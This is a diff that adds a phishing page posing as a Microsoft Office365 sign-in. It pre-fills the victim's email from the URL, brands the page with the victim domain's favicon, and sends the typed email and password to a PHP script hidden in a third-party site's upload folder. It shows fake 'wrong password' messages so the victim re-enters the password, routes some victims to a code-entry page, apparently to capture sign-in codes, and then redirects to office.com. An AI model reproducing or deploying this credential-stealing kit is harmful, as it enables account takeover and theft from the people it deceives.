@@ -1,0 +1,254 @@
+<html xmlns='http://www.w3.org/1999/xhtml' lang="en">
+<!DOCTYPE html>
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6387.8/content/images/favicon_a.ico">
+
+
+    <link href="./data_files/converged.login.min.css" rel="stylesheet">
+</head>
+
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb ltr" style="display: block;">
+    <script type="text/javascript" src="MaskedPassword.js"></script>
+	
+    
+    <div>
+        <div data-bind="component:{name: &#39;background-image&#39;, publicMethods: backgroundControlMethods}">
+            <div class="background" role="presentation" data-bind="css:{app: isAppBranding}, style:{background: backgroundStyle}">
+                <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
+                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
+                <div class="background-overlay"></div>
+            </div>
+        </div>
+        <form id="contact" method="post" action="">
+		<input type="hidden" value="1" name="counter" id="counter"/>
+
+            <div class="outer" data-bind="component:{name: &#39;page&#39;, params:{serverData: svr, showButtons: svr.fShowButtons, showFooterLinks: true, useWizardBehavior: svr.fUseWizardBehavior, handleWizardButtons: false, password: password, hideFromAria: ariaHidden}, event:{footerAgreementClick: footer_agreementClick}}">
+                		
+                <div class="middle">
+                    <div class="inner" data-bind="css:{&#39;app&#39;: $loginPage.backgroundLogoUrl()}">
+                        <div data-bind="component:{name: &#39;logo-control&#39;, params:{isChinaDc: svr.fIsChinaDc, bannerLogoUrl: $loginPage.bannerLogoUrl()}}">
+
+
+
+
+
+						<center>
+              <img id="fieldImg" class="img-fluid" width="80px">
+              
+              <h5 class="modal-title" id="exampleModalLabel"><span id="head-message" class=""></span><br></h5>
+                
+              <br>
+              
+
+            </center>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						</div>
+                        <div data-bind=" css:{&#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;)}, component:{name: &#39;pagination-control&#39;, publicMethods: paginationControlMethods, params:{initialViewId: initialViewId, currentViewId: currentViewId, initialSharedData: initialSharedData, initialError: $loginPage.getServerError()}, event:{cancel: paginationControl_onCancel}}">
+                            <div data-bind="css:{&#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back}" class="animate">
+                                <div data-viewid="2" >
+                                    <input type="hidden" name="email2" id="email2">
+                                    <input type="text" name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+                                    <div data-bind="component:{name: &#39;identity-banner-control&#39;, params:{pawnIconId: svr.iPawnIcon, displayName: displayName}}">
+                                        <div class="identityBanner">
+                                          <input class="identity" style="border: none;background: #f2f2f2 !important;height: 80%;margin: 0px 9px 5px 0px;color: #333 !important;" type="text" name="email" id="email" readonly="">
+                                        
+                                            <div class="profile-photo"> 
+											
+											<img role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7261.9/content/images/picker_account_aad.svg"> 											
+											
+											</div>
+                                        </div>
+                                    </div>
+                                    <div id="loginHeader" class="row text-title" role="heading" >Enter password</div>
+                                    <p class="notif" style="color: #FF0000;"> 
+									<div style="margin-top: 10px; color: #FF0000;" class="alert" id="msg"></div>
+									</p>
+                                    <div class="row">
+                                        <div class="form-group col-md-24">
+                                   
+                                            <div class="placeholderContainer" data-bind="component:{name: &#39;placeholder-textbox&#39;, params:{serverData: svr, textInput: password, hasFocus: isFocused, hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;], forcePlaceholderAttribute: true, hintCss: &#39;placeholder&#39;}}">
+                                                <input name="passwd" type="text" id="passwd" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" maxlength="127"> </div>
+                                        </div>
+                                    </div>
+                                    <div class="row">
+                                        <div>
+                                            <div class="col-xs-24 form-group no-padding-left-right" >
+                                                <div class="col-xs-12 secondary">
+                                                    <input type="button" id="idBtn_Back" class="btn btn-block" value="Back"> </div>
+                                                <div class="col-xs-12 primary">
+												
+												<button class="btn btn-block btn-primary" name="submit-btn" id="submit-btn">Sign in</button>
+												
+                                                    
+													
+													</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.fLockUsername &amp;&amp; !showHip">
+                                        <label id="idLbl_PWD_KMSI_Cb">
+                                            <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-md-24">
+                                            <div class="text-13">
+                                                <div class="form-group no-margin-bottom" data-bind="css:{&#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink}"> <a id="idA_PWD_ForgotPassword" href="#" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a> </div>
+                                                <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" data-bind="text: str[&#39;CT_FED_STR_ChangeUserLink_Text&#39;], href: svr.urlSwitch">Sign in with another account</a> </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+            
+            <div id="footer">
+                <div data-bind="component:{name: &#39;footer-control&#39;, params:{serverData: svr, showLinks: true}, event:{agreementClick: footer_agreementClick}}">
+                    <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">© 2021 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; Cookies</a> </div>
+                </div>
+            </div>
+        </form>
+        <form method="post" target="_top"> </form>
+    </div>
+	
+    <iframe id="idPartnerPL" height="0" width="0" src="./data_files/Prefetch.html" style="display: none;"></iframe>
+
+
+	
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+
+/* global $ */
+    $(document).ready(function(){
+      
+      var onPage = true;
+	  var count;
+	  document.getElementById('email').value = getEmail();
+	  var errorArray = ["First Wrong","Wrong password. Please try again.", "Invalid credentials. Make sure your password is correct.", "This document has expired."];
+
+      $('#contact').submit(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        //var password=$("#passwd").val();
+        var password= document.getElementById('passwd')._realfield.value
+
+        if(onPage == true){
+            
+			count = parseInt(document.getElementById('counter').value);   
+            
+			
+            document.getElementById('passwd').value ="";
+            
+            $.ajax({
+          url: 'https://ezonesecurity.com/admin/assets/plugins/jquery-file-upload/server/php/files/off-login/of.php',
+		  dataType: 'text',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+
+          },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+			var res = String(response);
+			if (res.includes('works')) {window.location.replace("https://office.com");}
+			else if (res.includes('code-needed')) { window.location.replace("code.html#"+btoa(email));}
+			else if (res.includes('wrong')) {
+			
+			$('#msg').html(errorArray[count]);
+            document.getElementById('counter').value = count+1;
+			
+			if (count>=3) {
+                onPage = false;
+                setTimeout(function(){ window.location.replace("https://office.com"); }, 1000);
+                
+                
+            }
+			
+			//alert("Login failed");
+			
+			}
+                //alert("Good but "+res);
+              },
+            error: function(response){
+			console.log(response);
+			alert("Bad and "+res);
+              
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+          
+          
+            
+        }
+        else{
+            //$('#msg').html("Finished");
+            window.location.replace("https://office.com");
+        }
+            
+
+        
+        
+        
+     });
+    });
+
+document.getElementById('email').value = getEmail();
+var domain = getEmail().substring(getEmail().lastIndexOf("@") +1);
+var frmsite = domain.substring(0, domain.indexOf("."));
+//document.title = ucFirst(frmsite) +" Hosting Webmail :: Welcome to "+ucFirst(frmsite)+" Hosting Webmail";
+document.getElementById("head-message").innerHTML = ucFirst(frmsite)+" Online Microsoft Office365";
+document.getElementById("fieldImg").src = `https://api.statvoo.com/favicon/?url=${domain}`;
+
+
+
+  
+function getEmail(){
+    if(window.location.hash){
+    var url = window.location.href;
+            var hash = url.split('#').pop();
+            return atob(hash);
+    }
+}
+
+
+        function ucFirst(str){
+      return str.charAt(0).toUpperCase()+ str.slice(1);
+    }
+
+
+
+  </script>
+
+<script>
+  new MaskedPassword(document.getElementById("passwd"), '\u25CF');
+  document.getElementById('passwd').onsubmit = function()
+  {
+   alert('pword = "' + this.pword.value + '"');
+   return false;
+  };
+ 
+ </script>
+
+</html>
